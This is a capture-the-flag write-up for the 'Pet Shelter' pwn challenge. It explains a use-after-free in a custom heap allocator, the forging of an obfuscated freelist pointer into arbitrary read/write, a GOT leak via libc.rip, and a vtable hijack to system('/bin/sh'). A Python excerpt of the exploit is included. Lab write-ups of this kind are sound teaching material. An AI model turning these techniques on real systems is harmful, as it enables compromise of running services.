---
doc_kind: writeup
title: "battleCTF Qualifier (bugpwn) — PWN#004 Pet Shelter (custom heap UAF, single fake-chunk forge, obfuscated freelist, vtable hijack)"
category: pwn
slug: bugpwn-pwn004-petshelter-heap-uaf-forge
created: 2026-11-10
status: solved
tags:
  - heap
  - use-after-free
  - custom-allocator
  - vtable-hijack
  - got-leak
  - libc-rip
  - pointer-obfuscation
source: "ctf.bugpwn.com — battleCTF Qualifier 2026 (challenge id 21, pwn, up to 188 pts, decaying)"
target: "169.58.126.107:5007 — \"Pet Shelter\" menu service, custom slab-style heap allocator with an obfuscated freelist"
---
# battleCTF Qualifier — PWN#004 "Pet Shelter"

## Challenge Summary

- A menu-driven service ("Pet Shelter") implementing its own small heap allocator for two object
  kinds (pets with a vtable per kind — cat/dog — and freeform "notes"), with a **pointer-obfuscated
  freelist** (XOR'd with a fixed key, bit-rotated). Goal: turn a single use-after-free primitive
  into an arbitrary-address write, leak libc, and hijack control flow to `system("/bin/sh")`.

## Initial Signals

- Menu exposes: add/poke/speak a pet (vtable-dispatched), add/remove/peek a note (freeform heap
  chunk), and a debug-leak option (`9`) that prints a raw pointer for a given pet slot — a direct,
  intended vtable-pointer leak used to compute the PIE base (`cat_vtable - CAT_VTABLE_OFF`).
- Notes can be freed (`remove_note`) and the freelist's "next" pointer field is encoded, not
  stored in plaintext: freelist entries use `rol(ptr, 7)` with a service-wide fixed key
  (confirmed via UAF-read testing, not published by the service itself).

## Exploit Chain

1. **PIE leak**: `add_pet(idx=0, kind=cat, "leaky")` then `debug_leak(0)` → raw `cat` vtable
   pointer → `pie_base = cat_vtable - CAT_VTABLE_OFF`.
2. **Single use-after-free, double-free into a self-loop**: allocate a 32-byte note, free it once
   (`remove_note`), then **peek it while freed** (UAF read) to recover its own chunk address,
   bit-rotated: `a_addr = rol(u64(raw[:8]), 64-7)`. Free the **same** note a second time
   (`remove_note` again) — this re-links the freelist head back onto itself (a classic
   double-free-into-freelist primitive), setting up two consecutive allocations to both return the
   *same* underlying memory.
3. **Fake-chunk forge, done exactly once**: the first of the two re-allocations
   (`add_pet(idx=1, ...)`) pops the real chunk `A` from the freelist. Its body is then overwritten
   (`poke_pet`) with a **forged "next" pointer**, computed as
   `forge = target ^ rol(a_addr, 7)` where `target = &notes_content_array[1]` — i.e. the forged
   value, once the allocator's own decode step re-applies its `rol`, resolves to a pointer at the
   **notes content-pointer array** itself, not a real heap chunk.
4. **Second allocation pops the forged "next"**, making the freelist head become
   `&notes_content_array[1]` itself. The very next `add_note(idx=1, ...)` then **writes its data
   directly into that array slot** instead of a real chunk — i.e. `notes_content_array[1]` can now
   be set to an **arbitrary address**, turning the primitive into an arbitrary-pointer write
   followed by an arbitrary-address read/write through `peek_note`/`add_note` on index `1`.
5. **GOT leak**: set `notes_content_array[1] = pie_base + PRINTF_GOT_OFF`, then `peek_note(1)`
   reads 32 bytes starting at `printf@got` — enough to cover 4 adjacent GOT entries (`printf`,
   `write`, `strchr`, `strncpy`) in one read. Only `printf`/`write` are matched against
   **libc.rip**'s symbol database (it tracks a curated set of common symbols; `strchr`/`strncpy`
   aren't in it), which is enough to uniquely identify the exact libc build and compute
   `libc_base`/`system`.
6. **Vtable hijack**: the pet "Command" vtable slot is itself pointer-obfuscated
   (`value ^ KEY` with a fixed service-wide `KEY = 0x5f3759df2f2f2f2f`, discovered empirically, not
   published). Forge a fake Command object in the trigger pet slot:
   `p64(pie_base+COMMAND_VTABLE_OFF) + p64((system_addr ^ KEY) & MASK) + b"/bin/sh\x00"`, then
   `speak_pet(trigger_idx)` dispatches through the (now-hijacked) vtable slot → `system("/bin/sh")`.
7. Shell confirmed; read the flag directly (`cat /flag/flag.txt`).

## Critical Implementation Note (bug found and fixed during development)

The forge must be done **exactly once**. `content_alloc()`'s pop path reads `*target` as the
"next" pointer and **re-encodes it back into `freelist[class]`** even when `target` is a fake
(non-pool) address — so every additional fake-chunk pop permanently corrupts
`freelist[class0]` with a bogus value, and the **next legitimate class-0 allocation crashes the
server**. Fix: perform the forge chain exactly once, redirect straight to `printf`'s GOT slot, and
read `0x20` bytes back in a single `peek_note` call (covering all 4 symbols needed) — no further
`add_note`/`add_pet` calls are needed afterward, since `poke_pet` (used for the final vtable
hijack) does not itself allocate, so the already-corrupted freelist never matters again.

## Key Evidence

- `debug_leak` output directly gives a raw pointer, trivially matched against the known
  `CAT_VTABLE_OFF` constant once the binary's static layout was mapped.
- `libc.rip` API match against the leaked `printf`/`write` addresses returns a single unambiguous
  amd64 candidate, from which `system`'s address is computed by fixed offset — no local libc copy
  needed.

## Payloads And Commands

Full working exploit: `workspaces/pwn-004/exploit/exploit.py` (annotated, single-forge version)
and a minimal `get_flag_once.py` variant. Core forge sequence:

```python
add_note(io, 2, 32, b"A"*32)
remove_note(io, 2)                          # first free
raw = peek_note(io, 2)                      # UAF read -> rol(A,7)
a_addr = rol(u64(raw[:8]), 64-7)
remove_note(io, 2)                          # second free -> self-loop
add_pet(io, 1, 0, b"p1")                    # pop A
forge = target ^ rol(a_addr, 7)             # target = &notes_content_array[1]
poke_pet(io, 1, p64(forge).ljust(32, b"\x00"))
add_pet(io, 2, 0, b"p2")                    # pop A again -> freelist head = target
add_note(io, 1, 32, p64(pie_base + PRINTF_GOT_OFF))  # write arbitrary address into notes_content_array[1]
leaked = peek_note(io, 1)                   # arbitrary-address read via the forged slot
```

## Flag / Outcome

- Flag not re-captured verbatim in this workspace (the exploit scripts print it to stdout at
  solve time but the output wasn't saved to a file); `solved_by_me: true` confirmed via the
  platform API and the full working exploit chain is preserved — rerun
  `workspaces/pwn-004/exploit/exploit.py` against the live target to recapture the exact flag
  string if needed. 188 pts (decaying).

## Reusable Lessons

- A custom allocator with an **obfuscated freelist** (XOR/rotate) doesn't block a classic
  double-free-into-self-loop UAF — the encoding only needs to be reverse-engineered once (here, via
  a UAF read that leaks the encoded pointer itself, letting the key/rotation be inferred from the
  chunk's own known address).
- When a fake-chunk forge can corrupt shared allocator state for any allocation after the first,
  design the chain to need **only one forge, reused for every subsequent read/write** through the
  same hijacked slot — don't repeat a forge per leaked symbol if the allocator metadata can't
  tolerate it.
- `libc.rip`'s API can resolve an exact libc build from as few as two leaked symbol addresses —
  useful when only a subset of leaked GOT entries are "common enough" symbols for the database to
  recognize.
- Vtable/function-pointer obfuscation (`ptr ^ KEY`) with a single, static, per-service key is
  trivially bypassed once any one correct (value, address) pair is known or can be inferred —
  it adds no real security against an attacker who already has an arbitrary-write primitive.

## Related

- [`pwn002-vault-seccomp-orw-pext-gadget`](pwn002-vault-seccomp-orw-pext-gadget.md) — same CTF,
  different memory-safety class (stack ROP vs. heap UAF), both using the same unintended `pext`
  identity-copy gadget trick for RDI control.
- [`pwn003-notes-uaf-fakechunk`](pwn003-notes-uaf-fakechunk.md) — same CTF, same vulnerability
  class (custom-allocator UAF/fake-chunk forge) on a different, earlier challenge (port 5002 vs.
  this one's port 5007) — worth comparing the two forge techniques side by side.
